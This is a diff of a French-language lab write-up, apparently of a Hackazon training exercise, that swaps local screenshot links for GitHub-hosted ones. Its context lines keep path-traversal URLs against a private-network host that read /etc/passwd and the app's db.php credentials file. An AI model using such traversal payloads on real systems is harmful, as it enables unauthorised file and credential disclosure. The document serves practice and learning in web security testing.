@@ -37,7 +37,7 @@ by M0rPH3U53
 
 Rapport après fin de scan
 
-![Capture du 2025-02-09 18-32-13.png](file:///home/kali/.config/joplin-desktop/resources/bb45b742d0c843f7905ba152083c7b2c.png)
+![Capture du 2025-02-09 18-32-13](https://github.com/user-attachments/assets/f7a15fbf-7606-4783-9636-25fb2b55b3a2)
 
 &nbsp;
 
@@ -45,7 +45,8 @@ Traverser de chemin
 
 [http://192.168.56.75/account/documents?page=…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F /etc/passwd](http://192.168.56.75/account/documents?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%20/etc/passwd)
 
-![path_traversal.png](file:///home/kali/.config/joplin-desktop/resources/5419d791130e4b02816a6320624d7b1b.png)
+![path_traversal](https://github.com/user-attachments/assets/e91a4263-7b0e-4f02-9d97-60b3d5710e88)
+
 
 &nbsp;
 
@@ -53,7 +54,7 @@ Allons voir le fichier `db.php`
 
 [http://192.168.56.75/account/documents?page=…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F /var/www/hackazon/assets/config/db.php](http://192.168.56.75/account/documents?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%20/var/www/hackazon/assets/config/db.php)
 
-![injection_commande.png](file:///home/kali/.config/joplin-desktop/resources/0aa9639d9c7745499aff28ca80bff0f9.png)
+![injection_commande](https://github.com/user-attachments/assets/c43652d6-7621-4f0e-91c7-e967294ca101)
 
 &nbsp;
 
